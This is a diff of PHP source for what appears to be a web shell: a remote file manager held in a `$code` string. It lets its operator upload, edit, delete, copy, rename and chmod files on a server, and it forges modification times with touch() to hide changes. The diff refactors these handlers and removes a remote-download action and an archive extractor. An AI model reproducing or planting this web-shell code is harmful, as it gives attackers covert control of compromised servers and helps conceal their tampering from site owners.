@@ -7,18 +7,17 @@ $code =
 	function dirsize($dir){
         $f = $s = 0;
         $dh = @opendir($dir);
-        while (false !== ($file = @readdir($dh))){
-			if ($file === '.' || $file === '..')
-                continue;
-			
-			$path = $dir . DS . $file;
-			if (is_dir($path)){
-				$tmp = dirsize($path); 
-				$f += $tmp['f'];  
-				$s += $tmp['s'];  
-			} else {
-				$f++;
-				$s += @filesize($path);
+        while ($file = @readdir($dh)){
+			if ($file !== '.' && $file !== '..'){
+				$path = $dir . DS . $file;
+				if (@is_dir($path)){
+					$tmp = dirsize($path); 
+					$f = $f + $tmp['f'];  
+					$s = $s + $tmp['s'];  
+				} else {
+					$f++;
+					$s += @filesize($path);
+				}
 			}
         }
         @closedir($dh);
@@ -40,21 +39,21 @@ $code =
 		else if (($mode & 0x1000) === 0x1000) $type = 'pa';// FIFO pipe
 		else $type = '?';                                 // Unknown
 
-		$o['r'] = ($mode & 00400) ? 'r' : '-'; 
-		$o['w'] = ($mode & 00200) ? 'w' : '-'; 
-		$o['e'] = ($mode & 00100) ? 'x' : '-'; 
-		$g['r'] = ($mode & 00040) ? 'r' : '-'; 
-		$g['w'] = ($mode & 00020) ? 'w' : '-'; 
-		$g['e'] = ($mode & 00010) ? 'x' : '-'; 
-		$w['r'] = ($mode & 00004) ? 'r' : '-'; 
-		$w['w'] = ($mode & 00002) ? 'w' : '-'; 
-		$w['e'] = ($mode & 00001) ? 'x' : '-'; 
+		$owner['read'] = ($mode & 00400) ?    'r' : '-'; 
+		$owner['write'] = ($mode & 00200) ?   'w' : '-'; 
+		$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
+		$group['read'] = ($mode & 00040) ?    'r' : '-'; 
+		$group['write'] = ($mode & 00020) ?   'w' : '-'; 
+		$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
+		$world['read'] = ($mode & 00004) ?    'r' : '-'; 
+		$world['write'] = ($mode & 00002) ?   'w' : '-'; 
+		$world['execute'] = ($mode & 00001) ? 'x' : '-'; 
 
-		if ($mode & 0x800) $o['e'] = ($o['e']==='x') ? 's' : 'S';
-		if ($mode & 0x400) $g['e'] = ($g['e']==='x') ? 's' : 'S';
-		if ($mode & 0x200) $w['e'] = ($w['e']==='x') ? 't' : 'T';
+		if ($mode & 0x800){$owner['execute'] = ($owner['execute']==='x') ? 's' : 'S';}
+		if ($mode & 0x400){$group['execute'] = ($group['execute']==='x') ? 's' : 'S';}
+		if ($mode & 0x200){$world['execute'] = ($world['execute']==='x') ? 't' : 'T';}
 		
-		return $type.$o['r'].$o['w'].$o['e'].$g['r'].$g['w'].$g['e'].$w['r'].$w['w'].$w['e'];
+		return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
     }
 
     function getUser($filepath){
@@ -84,8 +83,7 @@ $code =
 		    $item = readdir($h);
 		    if ($item === '.' or $item === '..')
 		        continue;
-
-		    if (gettype($item) === 'boolean'){
+		    else if (gettype($item) === 'boolean'){
 		        closedir($h);
 		        if (!@rmdir($path))
 					return false;
@@ -209,22 +207,21 @@ $code =
 			case 'cdir':
 				if (file_exists($p['a'] . $p['b']))
 					sAjax(tText('alredyexists', 'object alredy exists'));
-				
-				@mkdir($p['a'] . $p['b'], 0777);
-				@chmod($p['a'] . $p['b'], 0777);
-				if (file_exists($p['a'] . $p['b']))
-					sAjax('OK');
-
-				sAjax(tText('fail', 'Fail!'));
+				else {
+					sAjax(@mkdir($p['a'] . $p['b'], 0777) ? 'OK' : tText('fail', 'Fail!'));
+					@chmod($p['a'] . $p['b'], 0777);
+				}
 				break;
 			case 'cfile':
 				if (file_exists($p['a'] . $p['b']))
 					sAjax(tText('alredyexists', 'object alredy exists'));
-
-				if (false !== file_put_contents($p['a'] . $p['b'], '')) 
-					sAjax('OK');
-
-				sAjax(tText('accessdenied', 'Access denied'));
+				else {
+					$fp = @fopen($p['a'] . $p['b'], 'w');
+					if ($fp){
+						@fclose($fp);
+						sAjax('OK');
+					} else sAjax(tText('accessdenied', 'Access denied'));
+				}
 				break;
 			case 'comp':
 				if ($p['dl']){
@@ -238,30 +235,6 @@ $code =
 					exit;
 				}
 				break;
-			case 'uncomp':
-				if ($p['dl']){
-					$types['zip'] = 'zip';
-					$types['tar'] = 'tar';
-					$types['tar.gz'] = 'targz';
-					$types['tgz'] = 'targz';
-
-					$fNames = array();
-					foreach($p['dl'] as $value){
-						$ext = pathinfo($value);
-						if (isset($types[ $ext['extension'] ]))
-							if (decompress($types[ $ext['extension'] ], $p['fl'] . $value, $p['fl']))
-								$fNames[] = $value;
-					}
-
-					sAjax(tText('pfm', 'Process files:') . implode(', ', $fNames) . ' (' . count($fNames) . ')');
-				}			
-				break;
-			case 'reup':
-				if (download($p['b'], $p['a'] . basename($p['b']))) 
-					sAjax('OK');
-
-				sAjax(tText('fail', 'Fail'));
-				break;
 			case 'copy': 
 				if ($p['dl']){
 					$fNames = Array();
@@ -271,22 +244,22 @@ $code =
 						$fileinfo = pathinfo($p['fl'] . $p['dl'][$z]);
 						if (!file_exists($p['fl'] . $p['dl'][$z]))
 							sAjax(tText('notexist', 'Object does not exist'));
-						
-						if (is_dir($p['fl'] . $p['dl'][$z])){ 
-							if (!@recursiveCopy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'] . DS)) $fNames[] = $p['dl'][$z];
-						} else {
-							if (!@copy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'])) $fNames[] = $p['dl'][$z];
+						else {
+							if (is_dir($p['fl'] . $p['dl'][$z])){ 
+								if (!@recursiveCopy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'] . DS)) $fNames[] = $p['dl'][$z];
+							} else {
+								if (!@copy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'])) $fNames[] = $p['dl'][$z];
+							}
 						}
 					}
-
 					sAjax(hsc(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']'));
 				}
 				break;
 			case 'del':
 				if (!file_exists($p['a']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				sAjax((is_dir($p['a']) ? @delTree($p['a']) : @unlink($p['a'])) ? 'OK' : tText('fail', 'Fail!'));	
+				else
+					sAjax((is_dir($p['a']) ? @delTree($p['a']) : @unlink($p['a'])) ? 'OK' : tText('fail', 'Fail!'));				
 				break;
 			case 'rdel':
 				if ($p['dl']){
@@ -305,46 +278,48 @@ $code =
 			case 'dl':
 				if (!file_exists($p['fl']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				$fileinfo = pathinfo($p['fl']);
-				header('Content-Type: application/x-' . $fileinfo['extension']);
-				header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
-				header('Content-Length: ' . filesize($p['fl']));
-				readfile($p['fl']);
-				exit;
+				else {
+					$fileinfo = pathinfo($p['fl']);
+					header('Content-Type: application/x-' . $fileinfo['extension']);
+					header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
+					header('Content-Length: ' . filesize($p['fl']));
+					@readfile($p['fl']);
+					exit;
+				}
 				break;
 			case 'edit':
-				if (file_put_contents($p['a'], $p['fc']))
-					sAjax(tText('ok', 'Ok!'));
-
-				tText('fail', 'Fail!');
+				$fp = @fopen($p['a'], 'w');
+				sAjax((@fwrite($fp, $p['fc']) ? tText('ok', 'Ok!') : tText('fail', 'Fail!')));
+				@fclose($fp);
 				break;
 			case 'mdate':
 				if (!@file_exists($p['a']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				if (isset($p['b'])) $time = strtotime($p['b']);
-				else $time = strtotime($p['y'] . '-' . $p['m'] . '-' . $p['d'] . ' ' . $p['h'] . ':' . $p['i'] . ':' . $p['s']);
-				sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+				else {
+					if (isset($p['b'])) $time = strtotime($p['b']);
+					else $time = strtotime($p['y'] . '-' . $p['m'] . '-' . $p['d'] . ' ' . $p['h'] . ':' . $p['i'] . ':' . $p['s']);
+					sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+				}
 				break;
 			case 'mdatec':
 				if (!@file_exists($p['a']) || !@file_exists($p['b'])) 
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				$time = @filemtime($p['b']);
-				sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+				else {
+					$time = @filemtime($p['b']);
+					sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+				}
 				break;				
 			case 'mpers':
 				if (!file_exists($p['a']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				sAjax(@chmod($p['a'], base_convert($p['b'], 8, 10)) ? 'OK' : tText('fail', 'Fail!'));
+				else
+					sAjax(@chmod($p['a'], base_convert($p['b'], 8, 10)) ? 'OK' : tText('fail', 'Fail!'));
 				break;	
 			case 'ren':
 				if (!file_exists($p['a']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
+				else
+					sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
 				break;
 		}
 	} else if (@$p['md'] === 'info'){
@@ -432,7 +407,7 @@ $code =
 							$sBuff .= '</div>';
 						}
 					} else
-						$sBuff .= sDialog(tText('hlerror', 'highlight_file() dont exist!'));
+						sDialog(tText('hlerror', 'highlight_file() dont exist!'));
 				} else {
 					$str = @fread($fp, filesize($p['t']));
 					$sBuff .= '<b>File:</b><br>' .
@@ -488,7 +463,7 @@ $code =
 		}
 	} else {
 		if (isset($p['ac']) && $p['ac'] === 'up')
-			$sBuff .= sDialog(@copy($_FILES['upf']['tmp_name'], $p['dir'] . DS . $_FILES['upf']['name']) ? tText('upload', 'Upload') . ' ' . tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+			sDialog(@copy($_FILES['upf']['tmp_name'], $p['dir'] . DS . $_FILES['upf']['name']) ? tText('upload', 'Upload') . ' ' . tText('ok', 'Ok!') : tText('fail', 'Fail!'));
 				
 		$currentdir = $shelldir;
         if (!empty($p['dir'])){
@@ -628,7 +603,7 @@ $code =
 			$sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 				<td width="2%">' . mCheck('chkall', '', 'CheckAll(this.form);') . '</td>
 				<td>' . tText('selected', 'Selected')  . ': ' . mLink(tText('download', 'Download'), 'showUISec("comp")') . ' | ' . 
-				mLink(tText('del', 'Del'), 'showUISec("rdel")') . ' | ' . mLink(tText('copy', 'Copy'), 'showUISec("copy")') . ' | ' . mLink(tText('uncompress', 'Uncompress'), 'showUISec("uncomp")') . '</td>
+				mLink(tText('del', 'Del'), 'showUISec("rdel")') . ' | ' . mLink(tText('copy', 'Copy'), 'showUISec("copy")') . '</td>
 				<td colspan="4" align="right">
 				<b>' . $d . '</b> ' . tText('dirs', 'Directories')  . ' / <b>' . $c . '</b> ' . tText('fils', 'Files') . '
 				</td>
